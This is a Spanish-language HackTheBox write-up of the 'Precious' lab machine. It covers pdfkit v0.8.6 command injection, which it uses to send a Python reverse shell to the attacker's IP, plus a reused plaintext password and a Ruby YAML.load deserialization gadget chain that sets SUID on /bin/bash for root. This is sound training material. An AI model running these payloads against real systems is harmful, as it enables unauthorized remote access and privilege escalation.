---
title: Precious Writeup - HackTheBox
date: 2024-08-12
categories: [WriteUps, HackTheBox]
tags: [Linux, Easy, HackTheBox]
img_path: /assets/img/htb/precious/
image: /assets/img/htb/precious/precious.png
---

La máquina **Precious** evalúa la explotación de vulnerabilidades web, centrándose en la deserialización en Ruby. Este write-up cubre cada etapa, desde el escaneo hasta la obtención de la flag de root.

## Reconocimiento
---
Realizamos un escaneo de puertos en la máquina objetivo utilizando `nmap` para identificar los servicios en ejecución.

```bash
nmap -p- --open -sS -Pn -n --min-rate 5000 -vvv 10.10.11.189 -oG allPorts
_______________________________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
---
El resultado indica que hay dos puertos abiertos: el puerto **22 (SSH)** y el puerto **80 (HTTP)**. A continuación, realizamos un escaneo más detallado para identificar las versiones de los servicios y posibles vulnerabilidades.

```bash
nmap -sCV -p22,80 10.10.11.189 -oN targeted 
_______________________________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeración
---
Como podemos ver, `nmap` muestra que el servidor web en el puerto 80 intenta redireccionar a `http://precious.htb`, por lo que debemos actualizar nuestro archivo `/etc/hosts`, agregando la IP y el dominio para acceder correctamente al sitio web.

```bash
echo "10.10.11.189\tprecious.htb" | tee -a /etc/hosts
```
---
Accedemos al sitio web en `http://precious.htb` y encontramos una página titulada "Convert Web Page to PDF". La funcionalidad de esta página permite convertir URLs en PDFs. Dado que la máquina no tiene acceso a internet, cualquier URL externa no funcionará, pero podemos probar usando nuestro propio servidor HTTP local para observar el comportamiento.

![precious-1](/assets/img/htb/precious/precious-1.png)

---
Iniciamos un servidor HTTP local en nuestro sistema.

```bash
python3 -m http.server 80
_______________________________________________________________________
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
---
A continuación, configuramos la URL en el formulario de la página web para que apunte a nuestro servidor local y hacemos click en "SUBMIT" para ver qué sucede.

![precious-2](/assets/img/htb/precious/precious-2.png)

---
Al observar el tráfico en nuestro servidor HTTP local, notamos que se realizó una solicitud GET a nuestro servidor, confirmando que el servicio está intentando acceder a nuestros archivos.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
_______________________________________________________________________
10.10.11.189 - - [10/Aug/2024 22:42:05] "GET / HTTP/1.1" 200 -
```
---
Al inspeccionar el archivo PDF que se creó, vemos que lista nuestros directorios existentes donde estaba corriendo nuestro servidor HTTP local.

![precious-3](/assets/img/htb/precious/precious-3.png)

## Explotación
---
Analizamos el archivo PDF generado por la aplicación web para buscar información útil. Utilizamos `exiftool` para revisar los metadatos del archivo PDF.

```bash
exiftool 46nqbgbxqfkbfzx05wcozlc4sptv6j6t.pdf
_______________________________________________________________________
ExifTool Version Number         : 12.76
File Name                       : 46nqbgbxqfkbfzx05wcozlc4sptv6j6t.pdf
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:08:10 22:42:06-05:00
File Access Date/Time           : 2024:08:10 22:42:07-05:00
File Inode Change Date/Time     : 2024:08:10 22:42:07-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

---
Observamos que ese archivo PDF fue generado por `pdfkit v0.8.6`. Investigamos sobre vulnerabilidades conocidas en dicha aplicación y versión, y descubrimos que es vulnerable a inyecciones de comandos. A continuación una prueba de concepto de dicha vulnerabilidad. [Guía de la vulnerabilidad](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

![precious-4](/assets/img/htb/precious/precious-4.png)

---
Según lo indicado, vamos a probar si podemos explotar esta vulnerabilidad, intentando inyectar el comando `id` en la página web.

![precious-5](/assets/img/htb/precious/precious-5.png)

---
Verificamos en el PDF que nos muestra el output del comando inyectado.

![precious-6](/assets/img/htb/precious/precious-6.png)

---
Vamos a enviar un payload a la aplicación para obtener una Reverse Shell. En nuestra máquina atacante, configuramos `netcat` para escuchar en el puerto 443.

```bash
nc -lvnp 443
_______________________________________________________________________
listening on [any] 443 ...
```
---
Luego, procedemos a enviar la reverse shell, especificando nuestra IP atacante y el puerto por el cual haremos la conexión.

```bash
http://10.10.16.2/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`
```

![precious-7](/assets/img/htb/precious/precious-7.png)

---
Recibimos una conexión en nuestra máquina, y logramos acceso a la máquina objetivo como el usuario `ruby`.

```bash
nc -lvnp 443
listening on [any] 443 ...
_______________________________________________________________________
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.189] 60916
ruby@precious:/var/www/pdfapp$ 
```

---
Realizamos un tratamiento de la TTY para poder trabajar cómodamente por la consola.

```bash
script /dev/null -c bash
# Presionamos "Control + Z"
stty raw -echo; fg
reset xterm
export TERM=xterm SHELL=bash
stty rows 25 columns 127
```

## Escalada de Privilegios
---
Enumeramos los usuarios del sistema para identificar posibles objetivos para escalar privilegios. Generalmente, sus shells serán `/bin/sh` o `/bin/bash`.

```bash
ruby@precious:~$ cat /etc/passwd | grep -E '(/bin/sh|/bin/bash)$'
_______________________________________________________________________
root:x:0:0:root:/root:/bin/bash
henry:x:1000:1000:henry,,,:/home/henry:/bin/bash
ruby:x:1001:1001::/home/ruby:/bin/bash
```
---
Encontramos el usuario `henry`, pero no tenemos acceso al archivo `user.txt` en su directorio home.

```bash
ruby@precious:~$  cd /home/henry/
ruby@precious:/home/henry$ cat user.txt 
_______________________________________________________________________
cat: user.txt: Permission denied
```
---
Buscamos todos los archivos en el directorio `/home/ruby` para encontrar posibles pistas, ignorando errores.

```bash
ruby@precious:~$ find /home/ruby 2>/dev/null
_______________________________________________________________________
/home/ruby
/home/ruby/.bundle
/home/ruby/.bundle/config
/home/ruby/.profile
/home/ruby/.bash_history
/home/ruby/.cache
/home/ruby/.cache/fontconfig
/home/ruby/.cache/fontconfig/CACHEDIR.TAG
/home/ruby/.cache/fontconfig/8750a791-6268-4630-a416-eea4309e7c79-le64.cache-7
/home/ruby/.cache/fontconfig/ef96da78-736b-4d54-855c-6cd6306b88f9-le64.cache-7
/home/ruby/.cache/fontconfig/7fbdb48c-391b-4ace-afa2-3f01182fb901-le64.cache-7
/home/ruby/.cache/fontconfig/cb67f001-8986-4483-92bd-8d975c0d33c3-le64.cache-7
/home/ruby/.bash_logout
/home/ruby/.bashrc
```
---
Descubrimos un archivo de configuración en el directorio oculto `.bundle`, revisando su contenido, vemos que contiene la contraseña del usuario `henry`.

```bash
ruby@precious:~$ cat /home/ruby/.bundle/config
_______________________________________________________________________
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```
---
Con la contraseña, cambiamos a usuario `henry` y leemos la flag `user.txt`.

```bash
ruby@precious:~$ su henry
Password: Q3c1AqGHtoI0aXAYFH
henry@precious:/home/ruby$ cat /home/henry/user.txt 
_______________________________________________________________________
fc1dd8bd3a4c3f******************
```
---
Ahora tenemos que conseguir acceso al superusuario root. Verificamos los comandos que el usuario `henry` puede ejecutar con `sudo`

```bash
henry@precious:~$ sudo -l
_______________________________________________________________________
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
---
Observamos que el usuario `henry` puede ejecutar el script `/opt/update_dependencies.rb` como `root` sin requerir una contraseña. Revisamos el contenido de dicho archivo.

```bash
henry@precious:~$ cat /opt/update_dependencies.rb
_______________________________________________________________________
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
---
Detectamos que el script utiliza `YAML.load`, lo cual puede ser vulnerable a ataques de deserialización. Además, carga el archivo `dependencies.yml` sin una ruta específica, lo que podría permitir la ejecución de código malicioso. Para explotar esta vulnerabilidad, creamos un archivo `dependencies.yml` con un payload diseñado para elevar nuestros privilegios. Este payload usa una vulnerabilidad en la deserialización YAML para agregar el permiso SUID al binario `/bin/bash`. [Guía de la vulnerabilidad](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)

```bash
cat <<EOF > dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve
EOF

```
---
Ejecutamos el script Ruby con `sudo`, usando el archivo `dependencies.yml` modificado para intentar explotar la vulnerabilidad.

```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
_______________________________________________________________________
sh: 1: reading: not found
Traceback (most recent call last):
	33: from /opt/update_dependencies.rb:17:in `<main>'
	32: from /opt/update_dependencies.rb:10:in `list_from_file'
	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
	19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
	18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
	14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
	13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
	12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
	11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
	10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
	9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
	8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
	7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
	6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
	5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
	3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
	2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```
---
Verificamos que el permiso SUID ha sido añadido al binario `/bin/bash`:

```bash
henry@precious:~$ ls -l /bin/bash
_______________________________________________________________________
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
---
Iniciamos una nueva instancia de bash con privilegios elevados, logrando convertirnos en el usuario root.

```bash
henry@precious:~$ bash -p
_______________________________________________________________________
bash-5.1# whoami
root
```
---
Por ultimo, leemos la flag de `root`.

```bash
bash-5.1# cat /root/root.txt 
_______________________________________________________________________
838cff93dc9fff******************
```